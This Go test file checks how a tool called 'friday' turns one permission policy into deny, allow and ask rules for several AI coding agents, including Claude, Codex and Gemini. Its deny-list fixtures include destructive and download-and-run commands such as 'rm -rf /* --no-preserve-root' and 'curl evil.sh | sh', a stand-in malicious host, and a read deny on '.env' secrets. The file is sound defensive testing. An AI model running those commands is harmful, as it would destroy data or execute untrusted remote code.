package render

import (
	"encoding/json"
	"reflect"
	"regexp"
	"sort"
	"strings"
	"testing"

	"github.com/pelletier/go-toml/v2"
	"github.com/zhivko-kocev/friday/internal/spec"
)

// fullPermissions exercises every axis with at least one pattern in each of
// the three actions somewhere across the five axes, so every renderer's
// axis-coverage and action-handling gets exercised by a single fixture.
func fullPermissions() spec.Permissions {
	return spec.Permissions{
		Version: 1,
		Read:    spec.PermissionAxis{Deny: []string{"**/.env"}},
		Write:   spec.PermissionAxis{Allow: []string{"src/**"}, Ask: []string{"**"}},
		Exec:    spec.PermissionAxis{Allow: []string{"git status", "npm run build"}, Deny: []string{"git push --force"}},
		Net:     spec.PermissionAxis{Allow: []string{"docs.anthropic.com"}, Ask: []string{"api.example.com"}, Deny: []string{"*"}},
		MCP:     spec.PermissionAxis{Allow: []string{"github/*"}, Ask: []string{"*"}},
	}
}

func contains(list []string, want string) bool {
	for _, s := range list {
		if s == want {
			return true
		}
	}
	return false
}

func anyContains(list []string, substr string) bool {
	for _, s := range list {
		if strings.Contains(s, substr) {
			return true
		}
	}
	return false
}

// --- Claude ---------------------------------------------------------------

func TestPermissionsClaudeFullMapping(t *testing.T) {
	payload, unmapped, err := Permissions("claude", fullPermissions())
	if err != nil {
		t.Fatal(err)
	}
	if len(unmapped) != 0 {
		t.Errorf("unmapped = %v, want none (claude maps every axis)", unmapped)
	}
	var doc struct {
		Permissions struct{ Allow, Ask, Deny []string } `json:"permissions"`
	}
	if err := json.Unmarshal(payload, &doc); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, payload)
	}
	for _, want := range []string{"Bash(git status)", "Bash(npm run build)", "Edit(src/**)", "Write(src/**)", "WebFetch(domain:docs.anthropic.com)", "mcp__github__*"} {
		if !contains(doc.Permissions.Allow, want) {
			t.Errorf("allow missing %q, got %v", want, doc.Permissions.Allow)
		}
	}
	for _, want := range []string{"Edit(**)", "Write(**)", "WebFetch(domain:api.example.com)", "mcp__*"} {
		if !contains(doc.Permissions.Ask, want) {
			t.Errorf("ask missing %q, got %v", want, doc.Permissions.Ask)
		}
	}
	for _, want := range []string{"Read(**/.env)", "Bash(git push --force:*)", "WebFetch(domain:*)"} {
		if !contains(doc.Permissions.Deny, want) {
			t.Errorf("deny missing %q, got %v", want, doc.Permissions.Deny)
		}
	}
}

func TestPermissionsClaudeEmptyYieldsNoPayload(t *testing.T) {
	payload, unmapped, err := Permissions("claude", spec.Permissions{})
	if err != nil {
		t.Fatal(err)
	}
	if payload != nil || len(unmapped) != 0 {
		t.Errorf("payload=%q unmapped=%v, want both empty", payload, unmapped)
	}
}

// TestPermissionsClaudeExecRendersAsCommandPrefix pins the deny-must-fire
// invariant for claude's exec axis: Claude matches Bash(cmd) *exactly*, so
// only the trailing ":*" form is the command prefix friday's exec patterns
// mean — a deny on "git push --force" has to cover "git push --force
// origin main" too. Claude recognises that wildcard only at the end of a
// pattern, so a wildcard anywhere else is reported, never silently dropped.
func TestPermissionsClaudeExecRendersAsCommandPrefix(t *testing.T) {
	p := spec.Permissions{
		Version: 1,
		Exec: spec.PermissionAxis{
			Allow: []string{"git status"},
			Ask:   []string{"npm run *"},
			Deny:  []string{"git push --force", "*", "rm -rf /* --no-preserve-root"},
		},
	}
	payload, unmapped, err := Permissions("claude", p)
	if err != nil {
		t.Fatal(err)
	}
	var doc struct {
		Permissions struct{ Allow, Ask, Deny []string } `json:"permissions"`
	}
	if err := json.Unmarshal(payload, &doc); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, payload)
	}
	// An allow keeps Claude's EXACT form: widening a glob-free allow into a
	// prefix would grant "git status && rm -rf /", which the user never wrote.
	if !contains(doc.Permissions.Allow, "Bash(git status)") {
		t.Errorf("allow = %v, want the exact-command rule (an allow must never be widened)", doc.Permissions.Allow)
	}
	if contains(doc.Permissions.Allow, "Bash(git status:*)") {
		t.Errorf("allow = %v, must not widen a glob-free allow into a command prefix", doc.Permissions.Allow)
	}
	if !contains(doc.Permissions.Ask, "Bash(npm run:*)") {
		t.Errorf("ask = %v, want the trailing glob folded into claude's \":*\"", doc.Permissions.Ask)
	}
	if !contains(doc.Permissions.Deny, "Bash(git push --force:*)") {
		t.Errorf("deny = %v, want an enforceable prefix deny", doc.Permissions.Deny)
	}
	if !contains(doc.Permissions.Deny, "Bash") {
		t.Errorf("deny = %v, want a wildcard-only pattern to deny the whole Bash tool", doc.Permissions.Deny)
	}
	if len(unmapped) != 1 || !strings.Contains(unmapped[0], "rm -rf /*") {
		t.Errorf("unmapped = %v, want one entry naming the interior-wildcard pattern", unmapped)
	}
}

// --- Copilot ----------------------------------------------------------------

func TestPermissionsCopilotOnlyNetMapped(t *testing.T) {
	payload, unmapped, err := Permissions("copilot", fullPermissions())
	if err != nil {
		t.Fatal(err)
	}
	var doc struct {
		AllowedUrls []string `json:"allowedUrls"`
		DeniedUrls  []string `json:"deniedUrls"`
	}
	if err := json.Unmarshal(payload, &doc); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, payload)
	}
	if !reflect.DeepEqual(doc.AllowedUrls, []string{"docs.anthropic.com"}) {
		t.Errorf("allowedUrls = %v", doc.AllowedUrls)
	}
	if !reflect.DeepEqual(doc.DeniedUrls, []string{"*"}) {
		t.Errorf("deniedUrls = %v", doc.DeniedUrls)
	}
	// net's ask pattern must appear in neither list, and must not be
	// reported unmapped either — Copilot's own default (prompt) is "ask".
	if contains(doc.AllowedUrls, "api.example.com") || contains(doc.DeniedUrls, "api.example.com") {
		t.Error("net ask pattern must not appear in allowedUrls or deniedUrls")
	}
	for _, u := range unmapped {
		if strings.Contains(u, "api.example.com") {
			t.Errorf("net ask must not be reported unmapped either (implicit via omission): %v", unmapped)
		}
	}
	wantUnmapped := []string{
		"read deny: **/.env",
		"write allow: src/**", "write ask: **",
		"exec allow: git status", "exec allow: npm run build", "exec deny: git push --force",
		"mcp allow: github/*", "mcp ask: *",
	}
	sort.Strings(unmapped)
	sort.Strings(wantUnmapped)
	if !reflect.DeepEqual(unmapped, wantUnmapped) {
		t.Errorf("unmapped = %v\nwant %v", unmapped, wantUnmapped)
	}
}

// TestPermissionsCopilotCatchAllAllowDroppedUnderAsk covers the tier
// inversion "omission means ask" only survives while nothing wider is left
// to auto-approve the ask pattern.
func TestPermissionsCopilotCatchAllAllowDroppedUnderAsk(t *testing.T) {
	p := spec.Permissions{
		Version: 1,
		Net:     spec.PermissionAxis{Allow: []string{"*"}, Ask: []string{"api.example.com"}, Deny: []string{"evil.example.com"}},
	}
	payload, unmapped, err := Permissions("copilot", p)
	if err != nil {
		t.Fatal(err)
	}
	var doc struct {
		AllowedUrls []string `json:"allowedUrls"`
		DeniedUrls  []string `json:"deniedUrls"`
	}
	if err := json.Unmarshal(payload, &doc); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, payload)
	}
	if contains(doc.AllowedUrls, "*") {
		t.Errorf("allowedUrls = %v, want the catch-all dropped (it auto-approves the ask host)", doc.AllowedUrls)
	}
	if !reflect.DeepEqual(doc.DeniedUrls, []string{"evil.example.com"}) {
		t.Errorf("deniedUrls = %v", doc.DeniedUrls)
	}
	if !anyContains(unmapped, "net allow: * dropped") {
		t.Errorf("unmapped must report the dropped allow; got %v", unmapped)
	}
}

// --- OpenCode -------------------------------------------------------------

func TestPermissionsOpenCodeTierOrderAndShape(t *testing.T) {
	payload, unmapped, err := Permissions("opencode", fullPermissions())
	if err != nil {
		t.Fatal(err)
	}
	s := string(payload)
	// Structural check via decode.
	var doc struct {
		Permission struct {
			Read     map[string]string `json:"read"`
			Edit     map[string]string `json:"edit"`
			Bash     map[string]string `json:"bash"`
			Webfetch map[string]string `json:"webfetch"`
		} `json:"permission"`
	}
	if err := json.Unmarshal(payload, &doc); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, payload)
	}
	if doc.Permission.Read["**/.env"] != "deny" {
		t.Errorf("read = %v", doc.Permission.Read)
	}
	if doc.Permission.Edit["src/**"] != "allow" || doc.Permission.Edit["**"] != "ask" {
		t.Errorf("edit = %v", doc.Permission.Edit)
	}
	if doc.Permission.Bash["git status"] != "allow" || doc.Permission.Bash["npm run build"] != "allow" || doc.Permission.Bash["git push --force"] != "deny" {
		t.Errorf("bash = %v", doc.Permission.Bash)
	}
	if doc.Permission.Webfetch["docs.anthropic.com"] != "allow" || doc.Permission.Webfetch["api.example.com"] != "ask" || doc.Permission.Webfetch["*"] != "deny" {
		t.Errorf("webfetch = %v", doc.Permission.Webfetch)
	}
	// mcp has no OpenCode equivalent.
	if !contains(unmapped, "mcp allow: github/*") || !contains(unmapped, "mcp ask: *") {
		t.Errorf("unmapped = %v, want mcp entries", unmapped)
	}

	// Byte-level tier order: within "edit", "src/**" (allow) must precede
	// "**" (ask); within "webfetch", allow precedes ask precedes deny.
	editObj := s[strings.Index(s, `"edit"`):]
	if strings.Index(editObj, `"src/**"`) > strings.Index(editObj, `"**"`) {
		t.Errorf("edit tier order wrong (allow must precede ask): %s", editObj)
	}
	webObj := s[strings.Index(s, `"webfetch"`):]
	iAllow := strings.Index(webObj, `"docs.anthropic.com"`)
	iAsk := strings.Index(webObj, `"api.example.com"`)
	iDeny := strings.Index(webObj, `"*":"deny"`)
	if !(iAllow < iAsk && iAsk < iDeny) {
		t.Errorf("webfetch tier order wrong (want allow<ask<deny): %s", webObj)
	}
}

func TestPermissionsOpenCodeRejectsAllDigitPattern(t *testing.T) {
	p := spec.Permissions{Exec: spec.PermissionAxis{Allow: []string{"42"}}}
	payload, unmapped, err := Permissions("opencode", p)
	if err != nil {
		t.Fatal(err)
	}
	if payload != nil {
		t.Errorf("payload = %s, want nil (only pattern was digit-only, unsafe)", payload)
	}
	if len(unmapped) != 1 || !strings.Contains(unmapped[0], "42") {
		t.Errorf("unmapped = %v, want one entry naming the unsafe pattern", unmapped)
	}
}

func TestPermissionsOpenCodeEmptyYieldsNoPayload(t *testing.T) {
	payload, unmapped, err := Permissions("opencode", spec.Permissions{})
	if err != nil {
		t.Fatal(err)
	}
	if payload != nil || len(unmapped) != 0 {
		t.Errorf("payload=%q unmapped=%v, want both empty", payload, unmapped)
	}
}

func TestPermissionsOpenCodeDuplicatePatternRendersOnce(t *testing.T) {
	// The same pattern in two tiers is legal canonical input; the object it
	// renders into must still name it once (JSON object names are unique),
	// at friday's own precedence.
	p := spec.Permissions{Version: 1, Exec: spec.PermissionAxis{Allow: []string{"git status"}, Deny: []string{"git status"}}}
	payload, _, err := Permissions("opencode", p)
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Count(string(payload), `"git status"`); got != 1 {
		t.Errorf("pattern emitted %d times, want 1 (duplicate JSON key):\n%s", got, payload)
	}
	var doc struct {
		Permission struct {
			Bash map[string]string `json:"bash"`
		} `json:"permission"`
	}
	if err := json.Unmarshal(payload, &doc); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, payload)
	}
	if doc.Permission.Bash["git status"] != "deny" {
		t.Errorf("bash = %v, want deny (deny beats allow)", doc.Permission.Bash)
	}
}

// --- Codex ------------------------------------------------------------------

func TestPermissionsCodexWorkspaceRootsAndNetwork(t *testing.T) {
	payload, unmapped, err := Permissions("codex", fullPermissions())
	if err != nil {
		t.Fatal(err)
	}
	var doc struct {
		Permissions struct {
			Friday struct {
				Description string `toml:"description"`
				Filesystem  struct {
					WorkspaceRoots map[string]string `toml:":workspace_roots"`
				} `toml:"filesystem"`
				Network struct {
					Enabled bool              `toml:"enabled"`
					Domains map[string]string `toml:"domains"`
				} `toml:"network"`
			} `toml:"friday"`
		} `toml:"permissions"`
	}
	if err := toml.Unmarshal(payload, &doc); err != nil {
		t.Fatalf("invalid TOML: %v\n%s", err, payload)
	}
	fp := doc.Permissions.Friday
	if fp.Filesystem.WorkspaceRoots["**/.env"] != "deny" {
		t.Errorf("workspace_roots[**/.env] = %q, want deny", fp.Filesystem.WorkspaceRoots["**/.env"])
	}
	if fp.Filesystem.WorkspaceRoots["src/**"] != "write" {
		t.Errorf("workspace_roots[src/**] = %q, want write", fp.Filesystem.WorkspaceRoots["src/**"])
	}
	if !fp.Network.Enabled {
		t.Error("network.enabled = false, want true (net rules present)")
	}
	if fp.Network.Domains["docs.anthropic.com"] != "allow" || fp.Network.Domains["*"] != "deny" {
		t.Errorf("domains = %v", fp.Network.Domains)
	}

	for _, want := range []string{
		"write ask: **", "exec allow: git status", "exec allow: npm run build",
		"exec deny: git push --force", "net ask: api.example.com",
		"mcp allow: github/*", "mcp ask: *",
	} {
		if !anyContains(unmapped, want) {
			t.Errorf("unmapped missing an entry containing %q; got %v", want, unmapped)
		}
	}
	foundActivationNote := false
	for _, u := range unmapped {
		if strings.Contains(u, "default_permissions") {
			foundActivationNote = true
		}
	}
	if !foundActivationNote {
		t.Errorf("unmapped must note the profile needs manual activation; got %v", unmapped)
	}
}

func TestPermissionsCodexConflictResolvesToMoreRestrictive(t *testing.T) {
	// The same literal path denied for read but allowed for write cannot be
	// expressed as two independent facts in Codex's single-level-per-path
	// model; friday must fail closed (deny wins), matching Codex's own
	// path-precedence rule (deny > write > read) rather than depending on
	// map iteration order.
	p := spec.Permissions{
		Read:  spec.PermissionAxis{Deny: []string{"secrets/**"}},
		Write: spec.PermissionAxis{Allow: []string{"secrets/**"}},
	}
	payload, _, err := Permissions("codex", p)
	if err != nil {
		t.Fatal(err)
	}
	var doc struct {
		Permissions struct {
			Friday struct {
				Filesystem struct {
					WorkspaceRoots map[string]string `toml:":workspace_roots"`
				} `toml:"filesystem"`
			} `toml:"friday"`
		} `toml:"permissions"`
	}
	if err := toml.Unmarshal(payload, &doc); err != nil {
		t.Fatalf("invalid TOML: %v\n%s", err, payload)
	}
	if got := doc.Permissions.Friday.Filesystem.WorkspaceRoots["secrets/**"]; got != "deny" {
		t.Errorf("conflicting read-deny/write-allow resolved to %q, want deny (fail closed)", got)
	}
}

func TestPermissionsCodexEmptyYieldsNoPayload(t *testing.T) {
	payload, unmapped, err := Permissions("codex", spec.Permissions{})
	if err != nil {
		t.Fatal(err)
	}
	if payload != nil {
		t.Errorf("payload = %s, want nil", payload)
	}
	if len(unmapped) != 0 {
		t.Errorf("unmapped = %v, want none (nothing to render, nothing to activate)", unmapped)
	}
}

type codexProfileDoc struct {
	Permissions struct {
		Friday struct {
			Description string `toml:"description"`
			Filesystem  struct {
				WorkspaceRoots map[string]string `toml:":workspace_roots"`
			} `toml:"filesystem"`
			Network struct {
				Enabled bool              `toml:"enabled"`
				Domains map[string]string `toml:"domains"`
			} `toml:"network"`
		} `toml:"friday"`
	} `toml:"permissions"`
}

func decodeCodexProfile(t *testing.T, payload []byte) codexProfileDoc {
	t.Helper()
	var doc codexProfileDoc
	if err := toml.Unmarshal(payload, &doc); err != nil {
		t.Fatalf("invalid TOML: %v\n%s", err, payload)
	}
	return doc
}

// TestPermissionsCodexDenyOnlyNetPolicyDisablesNetwork pins the enforceable
// -deny invariant for codex's network model: network.enabled is the master
// switch for command network access, so a policy that only denies must
// never flip it on.
func TestPermissionsCodexDenyOnlyNetPolicyDisablesNetwork(t *testing.T) {
	p := spec.Permissions{
		Version: 1,
		Read:    spec.PermissionAxis{Allow: []string{"src/**"}},
		Net:     spec.PermissionAxis{Deny: []string{"evil.example.com"}},
	}
	payload, unmapped, err := Permissions("codex", p)
	if err != nil {
		t.Fatal(err)
	}
	fp := decodeCodexProfile(t, payload).Permissions.Friday
	if fp.Network.Enabled {
		t.Error("network.enabled = true for a deny-only net policy — the deny renders as a widening")
	}
	if fp.Network.Domains["evil.example.com"] != "deny" {
		t.Errorf("domains = %v, want the deny entry present", fp.Network.Domains)
	}
	if !anyContains(unmapped, "network.enabled = false") {
		t.Errorf("unmapped must report that all command network access is off; got %v", unmapped)
	}

	// One allow entry is enough to justify the switch.
	p.Net.Allow = []string{"docs.anthropic.com"}
	payload, _, err = Permissions("codex", p)
	if err != nil {
		t.Fatal(err)
	}
	if !decodeCodexProfile(t, payload).Permissions.Friday.Network.Enabled {
		t.Error("network.enabled = false with an allow pattern present")
	}
}

func TestPermissionsCodexActivationNoteNamesProxyOnlyWithNetRules(t *testing.T) {
	fsOnly := spec.Permissions{Version: 1, Read: spec.PermissionAxis{Deny: []string{"secrets/**"}}}
	_, unmapped, err := Permissions("codex", fsOnly)
	if err != nil {
		t.Fatal(err)
	}
	if anyContains(unmapped, "network_proxy") {
		t.Errorf("a policy with no net axis must not instruct the user to enable features.network_proxy: %v", unmapped)
	}
	withNet := fsOnly
	withNet.Net = spec.PermissionAxis{Allow: []string{"docs.anthropic.com"}}
	if _, unmapped, err = Permissions("codex", withNet); err != nil {
		t.Fatal(err)
	}
	if !anyContains(unmapped, "network_proxy") {
		t.Errorf("a policy with net rules must name features.network_proxy: %v", unmapped)
	}
}

func TestPermissionsCodexCatchAllAllowDroppedUnderAsk(t *testing.T) {
	// Codex has no ask tier, so omitting an ask pattern only means "ask"
	// while nothing wider survives to auto-approve it. A catch-all allow
	// does, so it is dropped (fail closed) and the substitution reported.
	p := spec.Permissions{
		Version: 1,
		Read:    spec.PermissionAxis{Allow: []string{"**"}, Ask: []string{"secrets/**"}},
		Write:   spec.PermissionAxis{Deny: []string{"secrets/**"}},
		Net:     spec.PermissionAxis{Allow: []string{"*"}, Ask: []string{"api.example.com"}, Deny: []string{"evil.example.com"}},
	}
	payload, unmapped, err := Permissions("codex", p)
	if err != nil {
		t.Fatal(err)
	}
	fp := decodeCodexProfile(t, payload).Permissions.Friday
	if _, ok := fp.Filesystem.WorkspaceRoots["**"]; ok {
		t.Errorf("catch-all read allow survived an ask pattern it covers: %v", fp.Filesystem.WorkspaceRoots)
	}
	if _, ok := fp.Network.Domains["*"]; ok {
		t.Errorf("catch-all net allow survived an ask pattern it covers: %v", fp.Network.Domains)
	}
	for _, want := range []string{"read allow: ** dropped", "net allow: * dropped"} {
		if !anyContains(unmapped, want) {
			t.Errorf("unmapped must report the substitution %q; got %v", want, unmapped)
		}
	}
}

// TestPermissionsOhMyPiReportsEveryPatternUnmapped locks in the one thing
// friday can honestly do for oh-my-pi: its policy lives in config.yml and
// friday has no merge-yaml strategy, so nothing is written and every
// pattern the user declared — every deny included — is reported rather
// than silently dropped.
func TestPermissionsOhMyPiReportsEveryPatternUnmapped(t *testing.T) {
	payload, unmapped, err := Permissions("oh-my-pi", fullPermissions())
	if err != nil {
		t.Fatal(err)
	}
	if payload != nil {
		t.Errorf("payload = %s, want nil (no reachable permission surface)", payload)
	}
	want := []string{
		"read deny: **/.env",
		"write allow: src/**", "write ask: **",
		"exec allow: git status", "exec allow: npm run build", "exec deny: git push --force",
		"net allow: docs.anthropic.com", "net ask: api.example.com", "net deny: *",
		"mcp allow: github/*", "mcp ask: *",
	}
	sort.Strings(unmapped)
	sort.Strings(want)
	if !reflect.DeepEqual(unmapped, want) {
		t.Errorf("unmapped = %v\nwant %v", unmapped, want)
	}
}

// --- Gemini -----------------------------------------------------------------

type geminiRuleDoc struct {
	ToolName      string `toml:"toolName"`
	ArgsPattern   string `toml:"argsPattern"`
	CommandPrefix string `toml:"commandPrefix"`
	MCPName       string `toml:"mcpName"`
	Decision      string `toml:"decision"`
	Priority      int    `toml:"priority"`
}

func decodeGeminiRules(t *testing.T, payload []byte) []geminiRuleDoc {
	t.Helper()
	var doc struct {
		Rule []geminiRuleDoc `toml:"rule"`
	}
	if err := toml.Unmarshal(payload, &doc); err != nil {
		t.Fatalf("invalid TOML: %v\n%s", err, payload)
	}
	return doc.Rule
}

func TestPermissionsGeminiRuleShapeAndPriority(t *testing.T) {
	payload, unmapped, err := Permissions("gemini", fullPermissions())
	if err != nil {
		t.Fatal(err)
	}
	// gemini reaches every axis, but each projection is scoped to the tools
	// whose argument shape was verified; those gaps are reported, never
	// presented as full coverage.
	for _, want := range []string{"read_file", "write_file", "web_fetch"} {
		if !anyContains(unmapped, want) {
			t.Errorf("unmapped must name the tools each axis leaves uncovered; %q missing from %v", want, unmapped)
		}
	}
	if !strings.HasPrefix(string(payload), "# Managed by friday") {
		t.Errorf("missing ownership header:\n%s", payload)
	}
	rules := decodeGeminiRules(t, payload)
	var sawReadDeny, sawExecAllow, sawNetAsk, sawMCPAllow bool
	for _, r := range rules {
		switch {
		case r.ToolName == "read_file" && r.Decision == "deny":
			sawReadDeny = true
			if r.Priority != 900 {
				t.Errorf("read_file deny priority = %d, want 900", r.Priority)
			}
		case r.ToolName == "run_shell_command" && r.CommandPrefix == "git status":
			sawExecAllow = true
			if r.Decision != "allow" || r.Priority != 100 {
				t.Errorf("exec allow rule = %+v", r)
			}
		case r.ToolName == "web_fetch" && r.Decision == "ask_user":
			sawNetAsk = true
			if r.Priority != 500 {
				t.Errorf("net ask priority = %d, want 500", r.Priority)
			}
		case r.MCPName == "github":
			// mcpName names an MCP *server*; friday's "github/*" pattern
			// must arrive stripped of its tool component or it matches no
			// registered server at all.
			sawMCPAllow = true
			if r.Decision != "allow" || r.Priority != 100 {
				t.Errorf("mcp allow rule = %+v", r)
			}
		}
	}
	if !sawReadDeny || !sawExecAllow || !sawNetAsk || !sawMCPAllow {
		t.Errorf("missing expected rule(s); got %+v", rules)
	}
	// An mcp rule has no toolName at all — an explicit empty string is not
	// a tool match gemini's schema defines.
	wantToolNames := 0
	for _, r := range rules {
		if r.ToolName != "" {
			wantToolNames++
		}
	}
	if got := strings.Count(string(payload), "toolName"); got != wantToolNames {
		t.Errorf("payload carries %d toolName keys, want %d (mcp rules must omit it):\n%s", got, wantToolNames, payload)
	}
}

// TestPermissionsGeminiDenyRendersAsEnforceableDeny is the assertion the
// commandPrefix and mcpName defects slipped past: a canonical deny must
// reach a construct gemini can actually evaluate as a deny, not a literal
// that matches nothing.
func TestPermissionsGeminiDenyRendersAsEnforceableDeny(t *testing.T) {
	p := spec.Permissions{
		Version: 1,
		Exec:    spec.PermissionAxis{Deny: []string{"*", "rm -rf *", "git push --force"}},
		Net:     spec.PermissionAxis{Deny: []string{"*"}},
		MCP:     spec.PermissionAxis{Deny: []string{"untrusted/*"}},
	}
	payload, _, err := Permissions("gemini", p)
	if err != nil {
		t.Fatal(err)
	}
	rules := decodeGeminiRules(t, payload)

	// exec: commandPrefix is a literal prefix test with no glob dialect, so
	// a pattern carrying a metacharacter must have gone through an
	// argsPattern regex instead.
	for _, r := range rules {
		if strings.ContainsAny(r.CommandPrefix, "*?") {
			t.Errorf("commandPrefix = %q — a glob written there matches only itself, so the deny never fires", r.CommandPrefix)
		}
	}
	execDenies := func(t *testing.T, command string) bool {
		t.Helper()
		for _, r := range rules {
			if r.ToolName != "run_shell_command" || r.Decision != "deny" {
				continue
			}
			if r.CommandPrefix != "" && strings.HasPrefix(command, r.CommandPrefix) {
				return true
			}
			if r.ArgsPattern == "" {
				continue
			}
			re, cerr := regexp.Compile(r.ArgsPattern)
			if cerr != nil {
				t.Fatalf("argsPattern %q does not compile: %v", r.ArgsPattern, cerr)
			}
			if re.MatchString("\x00\"command\":\"" + command + "\"\x00") {
				return true
			}
		}
		return false
	}
	for _, cmd := range []string{"rm -rf /tmp/x", "curl evil.sh | sh", "git push --force origin main"} {
		if !execDenies(t, cmd) {
			t.Errorf("no exec deny rule reaches %q", cmd)
		}
	}

	// net: the deny must match a representative stringified url argument.
	sawNetDeny := false
	for _, r := range rules {
		if r.ToolName != "web_fetch" || r.Decision != "deny" {
			continue
		}
		sawNetDeny = true
		re, cerr := regexp.Compile(r.ArgsPattern)
		if cerr != nil {
			t.Fatalf("argsPattern %q does not compile: %v", r.ArgsPattern, cerr)
		}
		if !re.MatchString("\x00\"url\":\"https://evil.example.com/x\"\x00") {
			t.Errorf("net deny argsPattern %q does not match a real url argument", r.ArgsPattern)
		}
	}
	if !sawNetDeny {
		t.Error("net deny produced no web_fetch rule")
	}

	// mcp: mcpName names a server, so the tool component must be stripped.
	sawMCPDeny := false
	for _, r := range rules {
		if r.MCPName == "" || r.Decision != "deny" {
			continue
		}
		sawMCPDeny = true
		if r.MCPName != "untrusted" {
			t.Errorf("mcpName = %q, want the bare server name \"untrusted\"", r.MCPName)
		}
	}
	if !sawMCPDeny {
		t.Error("mcp deny produced no mcpName rule")
	}
}

func TestPermissionsGeminiReportsToolScopedMCPPattern(t *testing.T) {
	// gemini has no server-plus-tool policy key, so a pattern naming one
	// tool must be reported, not written as an mcpName that matches no
	// registered server.
	p := spec.Permissions{Version: 1, MCP: spec.PermissionAxis{Deny: []string{"github/create_issue"}}}
	payload, unmapped, err := Permissions("gemini", p)
	if err != nil {
		t.Fatal(err)
	}
	if payload != nil {
		t.Errorf("payload = %s, want nil (the only rule is unrepresentable)", payload)
	}
	if len(unmapped) != 1 || !strings.Contains(unmapped[0], "github/create_issue") {
		t.Errorf("unmapped = %v, want one entry naming the tool-scoped pattern", unmapped)
	}
}

func TestPermissionsGeminiEmptyYieldsNoPayload(t *testing.T) {
	payload, unmapped, err := Permissions("gemini", spec.Permissions{})
	if err != nil {
		t.Fatal(err)
	}
	if payload != nil || len(unmapped) != 0 {
		t.Errorf("payload=%q unmapped=%v, want both empty", payload, unmapped)
	}
}

// geminiArgsPattern is friday's own construction (see its doc comment), so
// its regex correctness is verified directly here against representative
// stringified-args samples, independent of a live gemini-cli process.
func TestGeminiArgsPatternMatchesIntendedPaths(t *testing.T) {
	cases := []struct {
		glob       string
		matches    []string
		notMatches []string
	}{
		{
			glob:       "**/.env",
			matches:    []string{`"file_path":"src/.env"`, `"file_path":".env"`, `"file_path":"a/b/c/.env"`},
			notMatches: []string{`"file_path":".envrc"`, `"file_path":"env"`},
		},
		{
			glob:       "src/**",
			matches:    []string{`"file_path":"src/a.go"`, `"file_path":"src/pkg/b.go"`},
			notMatches: []string{`"file_path":"lib/a.go"`},
		},
		// "a/prod.env" is deliberately absent from notMatches here: this
		// translation does not distinguish "*" from "**", asserted below.
		{
			glob:    "*.env",
			matches: []string{`"file_path":"prod.env"`},
		},
	}
	for _, tc := range cases {
		t.Run(tc.glob, func(t *testing.T) {
			pattern := geminiArgsPattern("file_path", tc.glob)
			re, err := regexp.Compile(pattern)
			if err != nil {
				t.Fatalf("constructed pattern does not compile: %v\npattern=%q", err, pattern)
			}
			for _, m := range tc.matches {
				if !re.MatchString("\x00" + m + "\x00") {
					t.Errorf("glob %q: pattern %q did not match %q", tc.glob, pattern, m)
				}
			}
			for _, m := range tc.notMatches {
				if re.MatchString("\x00" + m + "\x00") {
					t.Errorf("glob %q: pattern %q over-matched %q", tc.glob, pattern, m)
				}
			}
		})
	}
	// Document the known single-"*" vs "**" simplification explicitly: this
	// translation does not distinguish them (both become ".*"), so a
	// single-"*" glob is intentionally treated as directory-crossing too.
	pattern := geminiArgsPattern("file_path", "*.env")
	re := regexp.MustCompile(pattern)
	if !re.MatchString("\x00\"file_path\":\"a/prod.env\"\x00") {
		t.Error("single \"*\" is documented to behave like \"**\" in this translation, not path-segment-scoped")
	}
}

func TestGeminiArgsPatternEscapesLiteralRegexMetacharacters(t *testing.T) {
	pattern := geminiArgsPattern("url", "api.example.com")
	re, err := regexp.Compile(pattern)
	if err != nil {
		t.Fatal(err)
	}
	if !re.MatchString("\x00\"url\":\"api.example.com\"\x00") {
		t.Error("literal dot must match literal dot")
	}
	if re.MatchString("\x00\"url\":\"apiXexampleXcom\"\x00") {
		t.Error("literal dot must not behave as a regex wildcard (must be escaped)")
	}
}
